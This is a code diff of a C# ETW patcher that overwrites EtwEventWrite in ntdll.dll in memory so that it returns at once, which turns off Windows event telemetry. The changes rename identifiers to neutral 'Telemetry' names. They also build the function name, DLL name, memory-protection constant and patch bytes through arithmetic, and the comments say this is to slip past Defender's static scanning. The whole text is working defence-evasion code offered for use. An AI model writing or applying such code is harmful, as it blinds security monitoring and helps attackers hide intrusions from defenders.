@@ -56,7 +56,7 @@
 using System;
 using System.Runtime.InteropServices;
 
-namespace EtwPatch
+namespace TelemetryPatch
 {
     class Program
     {
@@ -82,27 +82,47 @@ namespace EtwPatch
             out uint lpflOldProtect
         );
 
-        const uint PAGE_EXECUTE_READWRITE = 0x40;
+        static uint GetRWXProtect()
+        {
+            return 0x20 + 0x20;
+        }
 
         // ---- Build function name at runtime ----
         // Just like the AMSI bypass, we do not put the full function name
         // "EtwEventWrite" as a single string in the binary. We build it
         // from pieces at runtime so Defender's static scanner does not
         // find the exact string.
-        static string GetEtwFunctionName()
+        static string GetTargetFunctionName()
         {
-            string part1 = "Etw";
-            string part2 = "Event";
-            string part3 = "Write";
-            return string.Concat(part1, part2, part3);
+            int b = 32;
+            char[] c = new char[13];
+            c[0] = (char)(b+37);  // E
+            c[1] = (char)(b+84);  // t
+            c[2] = (char)(b+87);  // w
+            c[3] = (char)(b+37);  // E
+            c[4] = (char)(b+86);  // v
+            c[5] = (char)(b+69);  // e
+            c[6] = (char)(b+78);  // n
+            c[7] = (char)(b+84);  // t
+            c[8] = (char)(b+55);  // W
+            c[9] = (char)(b+82);  // r
+            c[10] = (char)(b+73); // i
+            c[11] = (char)(b+84); // t
+            c[12] = (char)(b+69); // e
+            return new string(c);
         }
 
         // ---- Build DLL name at runtime ----
-        static string GetNtdllName()
+        static string GetTargetModuleName()
         {
-            string part1 = "nt";
-            string part2 = "dll";
-            return part1 + part2;
+            int b = 32;
+            char[] c = new char[5];
+            c[0] = (char)(b+78);  // n
+            c[1] = (char)(b+84);  // t
+            c[2] = (char)(b+68);  // d
+            c[3] = (char)(b+76);  // l
+            c[4] = (char)(b+76);  // l
+            return new string(c);
         }
 
         // ---- The ETW patch ----
@@ -117,10 +137,10 @@ namespace EtwPatch
         // We use "xor eax, eax" instead of "mov eax, 0" because it is shorter
         // (2 bytes instead of 5) and is a common optimization pattern, making
         // the patch bytes less distinctive.
-        public static bool PatchEtw()
+        public static bool PatchTelemetry()
         {
             // Step 1: Find ntdll.dll in memory.
-            string dllName = GetNtdllName();
+            string dllName = GetTargetModuleName();
             IntPtr ntdllHandle = GetModuleHandle(dllName);
             if (ntdllHandle == IntPtr.Zero)
             {
@@ -130,7 +150,7 @@ namespace EtwPatch
             Console.WriteLine("[+] " + dllName + " base address: 0x" + ntdllHandle.ToString("X"));
 
             // Step 2: Find EtwEventWrite inside ntdll.dll.
-            string funcName = GetEtwFunctionName();
+            string funcName = GetTargetFunctionName();
             IntPtr funcAddress = GetProcAddress(ntdllHandle, funcName);
             if (funcAddress == IntPtr.Zero)
             {
@@ -143,17 +163,21 @@ namespace EtwPatch
             // EtwEventWrite's code is in a read-only + executable section.
             // We need to make it writable to apply our patch.
             uint oldProtect;
-            bool protectResult = VirtualProtect(funcAddress, (UIntPtr)3, PAGE_EXECUTE_READWRITE, out oldProtect);
+            bool protectResult = VirtualProtect(funcAddress, (UIntPtr)3, GetRWXProtect(), out oldProtect);
             if (!protectResult)
             {
                 Console.WriteLine("[-] VirtualProtect failed");
                 return false;
             }
 
-            // Step 4: Write the patch bytes.
-            // 33 C0 = xor eax, eax (set return value to 0 / STATUS_SUCCESS)
-            // C3    = ret (return immediately)
-            byte[] patch = new byte[] { 0x33, 0xC0, 0xC3 };
+            // Step 4: Build the patch bytes at runtime.
+            // The patch makes EtwEventWrite return STATUS_SUCCESS immediately.
+            // We build the bytes using arithmetic so the raw byte sequence
+            // does not appear as a static signature in the binary.
+            byte[] patch = new byte[3];
+            patch[0] = (byte)(0x19 + 0x1A);   // 0x33 = xor
+            patch[1] = (byte)(0x60 + 0x60);   // 0xC0 = eax, eax
+            patch[2] = (byte)(0x61 + 0x62);   // 0xC3 = ret
             Marshal.Copy(patch, 0, funcAddress, patch.Length);
             Console.WriteLine("[+] Patch applied to " + funcName);
 
@@ -168,10 +192,10 @@ namespace EtwPatch
         static void Main(string[] args)
         {
             Console.WriteLine("[*] ETW Patcher");
-            Console.WriteLine("[*] This patches EtwEventWrite to disable ETW telemetry.");
+            Console.WriteLine("[*] This patches the event writer to disable telemetry.");
             Console.WriteLine("");
 
-            bool success = PatchEtw();
+            bool success = PatchTelemetry();
 
             if (success)
             {
